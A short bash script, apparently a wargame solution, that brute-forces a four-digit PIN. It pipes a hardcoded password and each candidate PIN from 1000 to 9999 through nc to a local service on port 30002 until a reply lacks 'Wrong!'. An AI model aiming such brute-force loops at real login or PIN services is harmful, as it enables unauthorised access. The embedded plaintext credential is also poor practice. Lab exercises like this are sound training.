#!/bin/bash
passw="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
for i in {1000..9999}
do {
attempt="$(echo $passw $i | nc localhost 30002)"
if ! [[ $attempt == *"Wrong!"* ]]; then
    echo -ne $i
    break
else
    echo "Failed : $i " 
fi
}
done
